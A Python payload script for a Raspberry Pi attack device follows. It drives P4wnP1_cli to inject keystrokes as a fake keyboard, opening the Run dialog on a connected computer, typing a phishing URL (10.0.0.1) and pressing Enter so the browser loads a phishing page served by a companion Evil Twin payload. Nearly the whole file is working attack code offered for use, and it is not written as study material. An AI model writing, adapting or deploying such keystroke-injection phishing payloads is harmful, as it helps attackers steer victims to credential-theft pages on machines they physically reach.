#!/usr/bin/env python3
"""
RaspyJack *payload* – **HID Attack: Open Phishing Page**
=========================================================
A HID attack that opens the default web browser and navigates to a
specified phishing URL. This is useful for directing a target to a
page hosted by another RaspyJack payload (like Evil Twin).
"""

import os, sys, subprocess, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- CONFIGURATION ---
# This should be the IP of your RaspyJack running the phishing page
PHISHING_URL = "http://10.0.0.1" 

# --- Display Functions ---
def show_message(lines):
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    y = 40
    for line in lines:
        draw.text((10, y), line, font=font, fill="lime")
        y += 15
    LCD.LCD_ShowImage(image, 0, 0)

# --- Main Attack Logic ---
def run_attack():
    show_message(["HID Attack:", "Phishing Page"])
    
    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
        show_message(["ERROR:", "P4wnP1_cli", "not found!"])
        return

    # DuckyScript to open the Run dialog, type the URL, and press Enter
    script = f"""
GUI r
delay(500)
type("{PHISHING_URL}")
delay(200)
press("ENTER")
"""
    
    command = f"P4wnP1_cli hid job -c '{script}'"
    
    try:
        subprocess.run(command, shell=True, check=True, timeout=20)
        show_message(["Attack Sent!", "Phishing Page"])
    except Exception as e:
        show_message(["Attack FAILED!"])
        print(f"Error running HID attack: {e}", file=sys.stderr)

# --- Execution ---
if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(3)
    finally:
        LCD = LCD_1in44.LCD()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("HID Attack payload finished.")
